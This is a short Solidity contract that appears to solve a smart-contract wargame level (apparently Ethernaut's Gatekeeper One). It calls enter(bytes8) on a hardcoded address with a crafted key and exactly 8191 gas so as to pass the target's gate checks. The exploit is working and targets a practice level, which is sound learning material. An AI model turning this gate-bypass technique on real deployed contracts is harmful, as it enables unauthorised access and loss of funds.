// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Level13 {
    address addr = 0x1F674B3a4758ed8c1608f0664387c69570570279;

    function attack() public {
        bytes8 b8 = 0xaB32758500007951;
        (bool b,) = address(addr).call{gas: 8191}(abi.encodeWithSignature("enter(bytes8)", b8));
        require(b);
    }
}
